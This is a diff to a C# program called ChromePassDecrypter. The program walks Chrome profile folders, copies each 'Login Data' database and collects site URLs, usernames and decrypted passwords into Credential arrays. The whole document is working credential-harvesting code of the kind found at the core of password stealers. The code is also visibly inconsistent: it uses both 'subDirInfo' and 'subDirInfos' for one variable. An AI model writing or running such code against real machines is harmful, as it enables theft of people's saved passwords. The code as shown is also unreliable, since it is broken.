@@ -25,6 +25,7 @@
  * For more information, please refer to <http://unlicense.org>
  */
 using System;
+using System.Collections;
 using System.Data.SQLite;
 using System.IO;
 using System.Runtime.InteropServices;
@@ -40,11 +41,9 @@ namespace ChromePassDecrypter
 	{
 		private static string pathToProfiles = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Google\Chrome\User Data";
 		
-		// TODO: Think about the return type
-		public static object GetPasswords()
+		public static Credential[] GetPasswords()
 		{
-			// TODO: placeholder...
-			object result = new Object();
+			ArrayList result = new ArrayList();
 			DirectoryInfo dirInfo = new DirectoryInfo(pathToProfiles);
 			DirectoryInfo[] subDirInfo = dirInfo.GetDirectories();
 			
@@ -53,23 +52,21 @@ namespace ChromePassDecrypter
 				// These directories are not important for us
 				if (subDirInfo[i].Name == "PepperFlash" ||
 				    subDirInfos[i].Name == "Performance Monitor Databases" ||
-					subDirInfos[i].Name == "pnacl" ||
-					subDirInfos[i].Name == "SwiftShader" ||
-					subDirInfos[i].Name == "Temp" ||
-					subDirInfos[i].Name == "WidevineCDM")
+				    subDirInfos[i].Name == "pnacl" ||
+				    subDirInfos[i].Name == "SwiftShader" ||
+				    subDirInfos[i].Name == "Temp" ||
+				    subDirInfos[i].Name == "WidevineCDM")
 				{
 					continue;
 				}
 				
-				// TODO: placeholder...
-				result += GetPasswords(subDirInfo[i].FullName + @"\Login Data");
+				result.AddRange(GetPasswords(subDirInfo[i].FullName + @"\Login Data"));
 			}
 			
-			return result;
+			return result.ToArray(typeof(Credential));
 		}
 		
-		// TODO: same here...
-		private static object GetPasswords(string pathToPasswordsFile)
+		private static Credential[] GetPasswords(string pathToPasswordsFile)
 		{
 			if (!File.Exists(pathToPasswordsFile))
 			{
@@ -80,7 +77,7 @@ namespace ChromePassDecrypter
 			string tempFile = Path.GetTempFileName();
 			File.Copy(pathToPasswordsFile, tempFile);
 			
-			// TODO: some return type init here
+			ArrayList result = new ArrayList();
 			
 			using (SQLiteConnection conn = new SQLiteConnection("Data Source=" + tempFile + ";Version=3;New=True;Compress=True;"))
 			{
@@ -105,6 +102,7 @@ namespace ChromePassDecrypter
 							{
 								password = "Password could not be retrieved: " + ex.Message;
 							}
+							result.Add(new Credential(originUrl, username, password));
 						}
 					}
 				}
@@ -120,7 +118,7 @@ namespace ChromePassDecrypter
 				// Some tweaking tools will clean this folder at some point..
 			}
 			
-			return ; // TODO: you know what to do...
+			return result.ToArray(typeof(Credential));
 		}
 	}
 }
